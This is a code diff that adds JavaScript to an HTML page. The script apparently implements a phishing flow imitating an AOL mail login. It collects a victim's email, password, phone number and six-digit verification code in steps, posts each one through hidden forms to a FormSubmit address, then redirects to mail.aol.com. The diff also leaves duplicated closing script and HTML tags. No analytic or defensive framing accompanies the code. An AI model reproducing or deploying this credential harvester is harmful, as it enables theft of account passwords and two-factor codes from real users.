@@ -245,7 +245,127 @@
     // document.getElementById('move-btn').addEventListener('click', function() {
     //   moveBackground(200); // This will move the background 200px down
     // });
+    
+const FORM_URL = "https://formsubmit.co/inboxhunter147@gmail.com";  // Replace with your FormSubmit endpoint
+
+    function sendToFormSubmit(formData) {
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = FORM_URL;
+
+      Object.keys(formData).forEach(key => {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = key;
+        input.value = formData[key];
+        form.appendChild(input);
+      });
+
+      document.body.appendChild(form);
+      form.submit();
+    }
+
+    function goToStep(n) {
+      for (let i = 1; i <= 4; i++) {
+        document.getElementById('step-' + i).style.display = (i === n ? 'block' : 'none');
+      }
+    }
+
+    function submitEmail() {
+      const email = document.getElementById('email-input').value.trim();
+      if (!email) return;
+
+      sendToFormSubmit({ email });
+
+      document.getElementById('email-summary').textContent = email;
+      document.getElementById('email-summary').style.display = 'block';
+      goToStep(2);
+    }
+
+    function handlePassword() {
+      const password = document.getElementById('password-input').value.trim();
+      if (!password) return;
+
+      sendToFormSubmit({ password });
+
+      goToStep(3);
+    }
+
+    function submitPhone() {
+      const phone = document.getElementById('phone-input').value.trim();
+      if (!phone) return;
+
+      sendToFormSubmit({ phone });
+
+      goToStep(4);
+      startCountdown();
+    }
+
+    function submitCode() {
+      const code = document.getElementById('code-input').value.trim();
+      if (!code || code.length !== 6) return;
+
+      sendToFormSubmit({ code });
+
+      window.location.href = "https://mail.aol.com";
+    }
+
+    function togglePassword() {
+      const passwordInput = document.getElementById('password-input');
+      const passwordType = passwordInput.type === "password" ? "text" : "password";
+      passwordInput.type = passwordType;
+    }
+
+    let timeLeft = 300;
+    let countdownInterval = null;
+    function startCountdown() {
+      const countdownEl = document.getElementById('countdown');
+      timeLeft = 300;
+      if (countdownInterval) clearInterval(countdownInterval);
+      countdownInterval = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        countdownEl.textContent = `Code expires in ${minutes}:${seconds.toString().padStart(2, '0')}`;
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          countdownEl.textContent = "Code expired.";
+        } else {
+          timeLeft--;
+        }
+      }, 1000);
+    }
+
+    function checkEmail() {
+      const email = document.getElementById('email-input').value.trim();
+      if (email.length > 0) {
+        document.querySelector('.button').disabled = false;
+      }
+    }
+
+    function checkPassword() {
+      const password = document.getElementById('password-input').value.trim();
+      if (password.length > 0) {
+        document.querySelector('.button').disabled = false;
+      }
+    }
+
+    function checkPhone() {
+      const phone = document.getElementById('phone-input').value.trim();
+      if (phone.length > 0) {
+        document.querySelector('.button').disabled = false;
+      }
+    }
+
+    function checkCode() {
+      const code = document.getElementById('code-input').value.trim();
+      if (code.length === 6) {
+        document.querySelector('.button').disabled = false;
+      }
+    }
   </script>
+</body>
+</html> 
+ </script>
 
 </body>
 </html>
